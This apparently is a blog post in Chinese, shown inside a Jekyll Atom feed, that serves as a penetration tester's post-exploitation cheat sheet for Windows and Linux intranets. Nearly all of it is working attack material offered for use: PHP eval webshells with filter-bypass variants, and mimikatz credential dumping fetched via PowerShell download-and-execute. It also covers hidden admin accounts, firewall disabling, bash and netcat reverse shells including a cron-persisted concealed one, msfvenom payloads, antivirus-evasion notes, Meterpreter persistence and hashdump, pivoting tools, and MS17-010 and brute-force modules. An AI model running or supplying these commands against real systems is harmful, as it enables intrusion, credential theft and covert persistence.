<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-05-28T11:07:22-04:00</updated><id>http://localhost:4000/</id><title type="html">tom0li</title><subtitle>Web sec RFID pentest Researcher</subtitle><entry><title type="html">内网备忘录</title><link href="http://localhost:4000/%E5%86%85%E7%BD%91%E5%A4%87%E5%BF%98%E5%BD%95/" rel="alternate" type="text/html" title="内网备忘录" /><published>2018-05-27T21:50:30-04:00</published><updated>2018-05-27T21:50:30-04:00</updated><id>http://localhost:4000/%E5%86%85%E7%BD%91%E5%A4%87%E5%BF%98%E5%BD%95</id><content type="html" xml:base="http://localhost:4000/%E5%86%85%E7%BD%91%E5%A4%87%E5%BF%98%E5%BD%95/">&lt;p&gt;文章内容没谈snmp利用，可以去乌云等社区获取，没有后续内网持久化，日志处理，bypass uac等内容。&lt;/p&gt;

&lt;h2 id=&quot;webshell&quot;&gt;Webshell&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;测试主站，搜wooyun历史洞未发现历史洞，github,svn,目录扫描未发现敏感信息,无域传送，端口只开了80端口，找到后台地址，想爆破后台，验证码后台验证，一次性，用ocr识别，找账号，通过google，baidu，bing等搜索，相关邮箱，域名等加常用密码组成字典，发现用户手册，找账号，发现未打码信息，和默认密码，试下登陆成功，找后台，上传有dog，用含有一句话的txt文件&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;，打包为zip，php文件&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'phar://1.zip/1.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;即可，c刀被拦，修改config.ini文件，php_make &lt;code class=&quot;highlighter-rouge&quot;&gt;@eval(call_user_func_array(base64_decode,array($_POST[action])));&lt;/code&gt;用回调函数，第一个为函数名，二个为传的参数.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;前期收集&quot;&gt;前期收集&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;query user || qwinsta 查看当前在线用户
net user  查看本机用户
net user /domain 查看域用户
net view &amp;amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多
net view /domain 查看有几个域
net view \\dc   查看dc域内共享文件
net group /domain 查看域里面的组
net group &quot;domain admins&quot; /domain 查看域管
net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管
net group &quot;domain controllers&quot; /domain 域控
net time /domain 
net config workstation   当前登录域 - 计算机名 - 用户名
net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
ipconfig
systeminfo
tasklist /svc
tasklist /S ip /U domain\username /P /V 查看远程计算机tasklist
net localgroup administrators &amp;amp;&amp;amp; whoami 查看当前是不是属于管理组
netstat -ano
nltest /dclist:xx  查看域控
dsquery
whoami /all 查看Mandatory Label uac级别和sid号
net sessoin 查看远程连接session(需要管理权限)
net share     共享目录
cmdkey /l   查看保存登陆凭证
echo %logonserver%  查看登陆域
spn –l administrator spn记录
set  环境变量
dsquery server - 查找目录中的 AD DC/LDS 实例
dsquery user - 查找目录中的用户
dsquery computer 查询所有计算机名称windows 2003
dir /s *.exe 查找指定目录下及子目录下没隐藏文件
arp -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;发现远程登录密码等密码 netpass.exe
下载https://www.nirsoft.net/utils/network_password_recovery.html&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;获取window vpn密码：&lt;/p&gt;

    &lt;p&gt;mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;wifi密码：&lt;/p&gt;

    &lt;p&gt;netsh wlan show profile 查处wifi名下一条命令用
  netsh wlan show profile WiFi-name key=clear&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ie代理&lt;/p&gt;

    &lt;p&gt;reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v ProxyServer&lt;br /&gt;
  reg query “HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pac代理&lt;/p&gt;

    &lt;p&gt;reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v AutoConfigURL   //引 t0stmail&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;一些命令&quot;&gt;一些命令&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping          icmp连通性
nslookup www.baidu.com vps-ip dns连通性
dig @vps-ip www.baidu.com
curl vps:8080  http连通性
tracert
bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 &amp;gt;=2008
fuser -nv tcp 80 查看端口pid
rdesktop -u username ip linux连接win远程桌面 (有可能不成功)
where file win查找文件是否存在 
找路径，Linux下使用命令find -name *.jsp来查找，Windows下，使用for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i
netstat -apn | grep 8888   kill -9 PID   查看端口并kill
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;3389&quot;&gt;3389&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;判断是内网，还是外网，内网转发到vps&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -ano,没有开启3389端口,复查下
tasklist /svc,查svchost.exe对应的TermService的pid,看netstat相等的pid即3389端口.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;添加user&quot;&gt;添加user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net user admin1 admin1 /add &amp;amp; net localgroup administrators admin1 /add&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;如不允许远程连接，修改注册表&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  
REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;关闭防火墙&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh firewall set opmode mode=disable &lt;/code&gt;
&lt;a href=&quot;http://www.91ri.org/5866.html&quot;&gt;3389user无法添加&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;隐藏win账户&quot;&gt;隐藏win账户&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;开启sys权限cmd&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'   add user 并隐藏  

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;win server有密码强度要求，改为更复杂密码即可&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/&quot;&gt;渗透技巧——Windows系统的帐户隐藏&lt;/a&gt;  &lt;br /&gt;
&lt;a href=&quot;http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/&quot;&gt;windows的RDP连接记录&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;反弹转发&quot;&gt;反弹，转发&lt;/h1&gt;

&lt;h2 id=&quot;linux-bash&quot;&gt;linux bash&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1
|
bash -i 交互的shell
&amp;gt;&amp;amp; 标准错误输出到标准输出
/dev/tcp/10.0.0.1/8080 建立socket ip port
0&amp;gt;&amp;amp;1 标准输入到标准输出

(crontab -l;echo '*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/IP/port;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i')|crontab -
猥琐版(crontab -l;printf &quot;*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/IP/PORT;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -
详细介绍 https://github.com/tom0li/security_circle/blob/master/15288418585142.md
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ngrok-backdoor&quot;&gt;ngrok-backdoor&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;Grok-backdoor是一个简单的基于python的后门，它使用Ngrok隧道进行通信。Ngrok后门可以使用Pyinstaller生成windows，linux和mac二进制文件.&lt;br /&gt;
虽然免杀，但如果开win防火墙会提示，生成后门时会询问是否捆绑ngrok，选择no时，在被攻击机执行时需联网下载ngrok，运行后，telnet连接即可. &lt;br /&gt;
github  https://github.com/deepzec/Grok-backdoor&lt;/p&gt;

&lt;h2 id=&quot;veil&quot;&gt;veil&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;这里，安装问题有点多，我用kali-2018-32安装成功，先安装下列依赖，后按照官方即可。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install libncurses5*
apt-get install libavutil55*
apt-get install gcc-mingw-w64*
apt-get install wine32  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;生成shell&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Veil.py
use 1
use c/meterpreter/rev_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在win gcc -o v.exe v.c -lws2_32 用mingw下gcc编译bypass 360&lt;br /&gt;
msfconsole -r veil.rc (其中veil.rc是之前生成的，bypass)&lt;/p&gt;

&lt;p&gt;python -m SimpleHTTPServer 80虚拟机里开启，在外访问虚拟机ip即可下载虚拟机文件&lt;/p&gt;

&lt;h2 id=&quot;ew&quot;&gt;ew&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;tools: http://rootkiter.com/EarthWorm&lt;br /&gt;
新版tools： http://rootkiter.com/Termite/&lt;br /&gt;
正向：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;被攻击机(跳板)：
        temp目录下
        unzip ew.zip
        file /sbin/init (查看linux位数)
        chmod 755 ew_for_Linux
        ./ew_for_Linux -s ssocksd -l 9999 (侦听0.0.0.0:9999)
        netstat -pantu|grep 9999 (查看是否侦听成功)
攻击机：
        proxychain设置socks5 为跳板ip port
        proxychain nmap即可以用跳板代理扫描其他主机
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;反向：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;攻击机：
	chmod 777 ./ew_for_linux64
	./ew_for_linux -s rcsocks -l 1080 -e 2333 即被攻击机连接本机2333端口，转发到本机的1080端口，访问本机的1080端口，相当访问被攻击机的2333
	设置proxychain socks5 本主机ip port：1080
	proxychain代理即可
被攻击机：
	chmod 777 ew_for_linux
	./ew_for_Linux32 -s rssocks -d 192.168.1.100 -e 2333
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;nc&quot;&gt;nc&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;a href=&quot;https://tom0li.github.io/2017/05/06/nc/&quot;&gt;nc简单使用&lt;/a&gt;&lt;br /&gt;
linux root 权限&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mknod /tmp/backpipe p  
/bin/sh 0&amp;lt;/tmp/backpipe | nc ip port 1&amp;gt;/tmp/backpipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;权限不够用mkfifo /tmp/backpipe&lt;br /&gt;
以上用nc监听即可&lt;/p&gt;

&lt;h2 id=&quot;lcx&quot;&gt;lcx&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;被攻击机 lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389
vps      lcx.exe –listen 8888 5555
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在本机mstsc登陆139.1.2.3:5555或在vps连接127.0.0.1:5555&lt;/p&gt;

&lt;h2 id=&quot;netsh-win自带只支持tcp360拦&quot;&gt;netsh win自带(只支持tcp)360拦&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080   将本地80转到192.168.1.101:8080端口

netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389   通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;gomsf--pymsf-bypass360&quot;&gt;go+msf &amp;amp; py+msf bypass360&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf编码生成后，用go build -ldflags=&quot;-H windowsgui -s -w&quot;即可，详细参考以下link   http://lu4n.com/metasploit-payload-bypass-av-note/ http://hacktech.cn/2017/04/20/msf-AntiVirus.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;提权&quot;&gt;提权&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;win提权辅助工具，原理主要通过systeminfo补丁信息比对漏洞库&lt;br /&gt;
工具链接 https://github.com/GDSSecurity/Windows-Exploit-Suggester&lt;/p&gt;

&lt;p&gt;linux提权辅助&lt;br /&gt;
https://github.com/jondonas/linux-exploit-suggester-2&lt;/p&gt;

&lt;p&gt;感谢前辈收集的提权exp，地址：&lt;br /&gt;
&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits&quot;&gt;windows-kernel-exploits Windows平台提权漏洞集合&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/SecWiki/linux-kernel-exploits&quot;&gt;linux-kernel-exploits Linux平台提权漏洞集合&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;msf&quot;&gt;msf&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;linux相关payload：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    linux/x86/meterpreter/reverse_tcp
    linux/x86/meterpreter/bind_tcp
    linux/x86/shell_bind_tcp
    linux/x86/shell_reverse_tcp
	linux/x64/shell/bind_tcp
	linux/x64/shell/reverse_tcp
	linux/x64/shell_bind_tcp
	linux/x64/shell_bind_tcp_random_port
	linux/x64/shell_reverse_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;windows相关payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    windows/meterpreter/reverse_tcp
    windows/meterpreter/bind_tcp
	windows/meterpreter/reverse_hop_http
	windows/meterpreter/reverse_http
	windows/meterpreter/reverse_http_proxy_pstore
	windows/meterpreter/reverse_https
	windows/meterpreter/reverse_https_proxy
    windows/shell_reverse_tcp
    windows/shell_bind_tcp
    windows/x64/meterpreter/reverse_tcp
    windows/x64/meterpreter/bind_tcp
    windows/x64/shell_reverse_tcp
    windows/x64/shell_bind_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;目标服务器为64位用x64监听，反弹meterpreter用含有meterpreter的模块，反弹普通的shell（例如nc），shell_reverse_tcp模块监听&lt;/p&gt;

&lt;p&gt;例如msf:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;反弹shell  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &amp;gt; shell.exe 
监听       windows/meterpreter/reverse_tcp

反弹shell  nc -e cmd.exe ip port 
监听       windows/shell_reverse_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;meterpreter下上传 upload file 下载 download file&lt;/p&gt;

&lt;h3 id=&quot;msf进程注入测试win10没成功win2008-可以360会拦&quot;&gt;Msf进程注入(测试win10没成功,win2008 可以，360会拦)&lt;/h3&gt;
&lt;hr /&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: xxxx
meterpreter &amp;gt; getpid
Current pid: 3456
meterpreter &amp;gt; ps

Process List
============
 PID   PPID  Name                       Arch  Session  User          Path
---   ----  ----                       ----  -------  ----          ----
 12000  676  shell.exe                  x86   2        xxx  C:\Users\xxx\Desktop\shell.exe
 676  1124  explorer.exe               x64   2        xxx  C:\Windows\explorer.exe

meterpreter &amp;gt; migrate 676
[*] Migrating from 12000 to 676...
[*] Migration completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;msf-hash&quot;&gt;Msf hash&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;meterpreter &amp;gt; run hashdump      需要sys权限 导出SAM&lt;/li&gt;
  &lt;li&gt;meterpreter &amp;gt; run post/windows/gather/smart_hashdump  需要sys权限&lt;/li&gt;
  &lt;li&gt;getsystem存在uac，用msf bypass，但特征明显 meterpreter &amp;gt; search bypassuac&lt;/li&gt;
  &lt;li&gt;msf powerdump load mimikatz 不太好用&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;msf的持续后门&quot;&gt;Msf的持续后门&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;run persistence -U -i 10 -p 10390 -r free.ngrok.cc 
会被360拦，-i 10 10秒请求一次   使用powershell执行也被监控而被360拦截
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;meterpreter 的 run getgui -e 命令可以开启成
功。360会提示阻止&lt;/p&gt;

&lt;p&gt;Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦&lt;/p&gt;

&lt;h3 id=&quot;msf-powershell&quot;&gt;Msf powershell&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load powershell
meterpreter &amp;gt; powershell_shell
PS &amp;gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
Ps &amp;gt; Invoke-Mimikatz -DumpCreds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;msf-router&quot;&gt;Msf Router&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell session下以被攻击机访问其他内网主机.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run get_local_subnets 
	[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
	[!] Example: run post/multi/manage/autoroute OPTION=value [...]
	Local subnet: 172.17.0.0/255.255.0.0
meterpreter &amp;gt; run autoroute -s 172.17.0.0/16  添加路由
meterpreter &amp;gt; run autoroute -p 				  查看路由
meterpreter &amp;gt; run autoroute -d -s 172.17.0.0/16  删除
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MS17-010&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background 
[*] Backgrounding session 1...
msf exploit(multi/handler) &amp;gt; use auxiliary/scanner/smb/smb_ms17_010 
msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; set rhosts 172.17.0.0/24
rhosts =&amp;gt; 172.17.0.0/24
msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; set threads 50
threads =&amp;gt; 50
msf auxiliary(scanner/smb/smb_ms17_010) &amp;gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先利用exploit/windows/smb/ms17_010_psexec，win10旧版依旧可以，新版设置smbuser，smbpass即可&lt;/p&gt;

&lt;h3 id=&quot;msf扫描&quot;&gt;Msf扫描&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;经过上面设置路由即可使用以下scan：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;常用port 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;服务扫描:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB版本识别：auxiliary/scanner/smb/smb_version 
MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
SSH版本信息：auxiliary/scanner/ssh/ssh_version
FTP版本识别：auxiliary/scanner/ftp/ftp_version
HTTP服务：auxiliary/scanner/http/http_header 返回相关header信息
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port：21 （FTP）&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破 其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:22 (SSH)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/ssh/ssh_login     其它：search SSH
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:23 (telnet)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:445&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜
exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝
auxiliary/scanner/smb/smb_login             //SMB登陆爆破 其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;port:3389 (远程桌面RDP)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/rdp/ms12_020_check 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;5900 (VNC)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/vnc/vnc_none_auth
auxiliary/scanner/vnc/vnc_login
exploit/multi/vnc/vnc_keyboard_exec
